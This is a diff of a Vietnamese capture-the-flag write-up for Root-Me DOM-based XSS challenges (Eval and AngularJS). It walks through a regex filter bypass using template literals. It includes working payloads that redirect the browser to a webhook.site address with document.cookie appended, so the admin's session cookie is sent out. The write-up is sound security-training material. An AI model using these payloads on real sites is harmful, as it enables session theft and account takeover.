@@ -147,6 +147,66 @@ Payload: `http://challenge01.root-me.org/web-client/ch32/?number=';document.loca
 
 ## Flag
 `rootme{XSS_D0M_BaSed_InTr0}`
+
+# XSS DOM Based - Eval
+A bad practice ...
+
+**Statement:** Steal the admin’s session cookie.
+## Cách làm
+Truy cập link http://challenge01.root-me.org/web-client/ch34/ thấy có một trường yêu cầu nhập phép toán
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/62cc4d64-708c-4acc-8ebf-e5d272e21d1f)
+
+Nhập thử một toán tử `-`:
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/b854b158-5077-484f-bd59-341e8f36480f)
+
+Bài này cần ta thực hiện chèn XSS vào một input tính toán và bị filter bởi regex: `/^\d+[\+|\-|\*|\/]\d+/`
+
+Thử lại với một phép toán thì thấy tính năng tính toán của các phép tính được thực hiện thông qua hàm `eval`:
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/a20b6358-8fd4-407e-8a4b-4e8abc6d3de6)
+
+Thử payload: `'; alert(1);//`
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/2dc580fa-90f9-40b6-ab82-e70c8fd47c40)
+
+Kí tự ngoặc tròn đã bị filter để ngăn việc thoát khỏi hàm eval, đầu vào cũng chỉ nhận format nhất định được lọc bởi regex
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/ca8acef7-1c45-43bc-95e6-9271d9534b85)
+
+Regex chỉ kiểm tra phần đầu của input. Ta có script của server:
+```html
+<script>
+
+var result = eval(2-1re);
+
+document.getElementById('state').innerText = '2-1re = ' + result;
+
+</script>
+```
+Mọi thứ đều bị filter khi cố chèn script vào đây. Đến đây, có thể giải quyết với template literals (Template literals cho phép ta thực thi một command dưới dạng ưu tiên trước khi bị block (nếu có) https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)
+
+Thử với payload: 
+```
+1+1,`${document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa"}`
+```
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/a84871e8-f62f-4f79-896b-6dd687cfefc0)
+
+Nó đã hoạt động vì thế ta chỉ cần gửi đến admin là lấy được flag:
+
+Payload: 
+```
+http://challenge01.root-me.org/web-client/ch34/index.php?calculation=1%2B1`${document.location=%22https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?%22%2Bdocument.cookie}`
+```
+
+![Screenshot 2023-11-12 181456](https://github.com/aQ05/Write-up/assets/121664384/965f245a-4321-446a-8d29-004ea4a999b8)
+
+
+## Flag
+`rootme{Eval_Is_DangER0us}`
+
 # XSS DOM Based - AngularJS
 Another angle
 
@@ -176,28 +236,6 @@ Payload: `{{$on.constructor(&#x27;document.location="https://webhook.site/aa5efb
 Payload đã chạy được. Giờ thì gửi payload đến admin qua Contact tab:
 `http://challenge01.root-me.org/web-client/ch35/?name={{$on.constructor(&#x27;document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?".concat(document.cookie)&#x27)()}}`
 
-
-# XSS DOM Based - Eval
-A bad practice ...
-
-**Statement: **Steal the admin’s session cookie.
-## Cách làm
-Truy cập link http://challenge01.root-me.org/web-client/ch34/ thấy có một trường yêu cầu nhập phép toán
-
-![image](https://github.com/aQ05/Write-up/assets/121664384/62cc4d64-708c-4acc-8ebf-e5d272e21d1f)
-
-Nhập thử một toán tử `-`:
-
-![image](https://github.com/aQ05/Write-up/assets/121664384/b854b158-5077-484f-bd59-341e8f36480f)
-
-Bài này cần ta thực hiện chèn XSS vào một input tính toán và bị filter bởi regex: `/^\d+[\+|\-|\*|\/]\d+/`
-
-Thử lại với một phép toán thì thấy tính năng tính toán của các phép tính được thực hiện thông qua hàm `eval`:
-
-![image](https://github.com/aQ05/Write-up/assets/121664384/a20b6358-8fd4-407e-8a4b-4e8abc6d3de6)
-
-Thử payload: `'; alert(1);//`
-
-![image](https://github.com/aQ05/Write-up/assets/121664384/2dc580fa-90f9-40b6-ab82-e70c8fd47c40)
-
-
+???
+## Flag
+``
